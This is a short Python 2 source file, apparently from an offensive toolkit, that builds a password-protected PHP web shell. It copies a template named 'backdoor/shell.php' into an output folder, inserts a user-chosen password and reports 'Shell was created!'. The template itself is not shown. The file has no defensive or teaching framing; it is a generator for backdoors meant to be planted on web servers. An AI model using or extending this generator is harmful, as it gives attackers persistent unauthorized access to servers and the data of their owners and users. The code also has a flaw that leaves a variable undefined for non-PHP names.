import sys

class Generator:
	def __init__(self,name,password):
		self.password = password
		self.name = name

	def set_generator(self):
		isphp = self.name.partition('.')
		if isphp[2] == "php":
			print 'Creating Shell file...'
			creating = self.php()
		if creating:
			print('robot@shuffle[~]$> Shell was created! in out/'+self.name)
		else:
			print("robot@shuffle[~]$> Something went wrong")
		sys.exit(1)	

	def php(self):
		try:
			file = open("out/"+self.name, 'w')
			file.close()
			with open('backdoor/shell.php') as f:
				with open("out/"+self.name, "w") as f1:
					for line in f:
						if "<password>" in line:
							f1.write("protected static $password = '"+self.password+"';")
						else:
							f1.write(line)
		except:
			return False
		return True
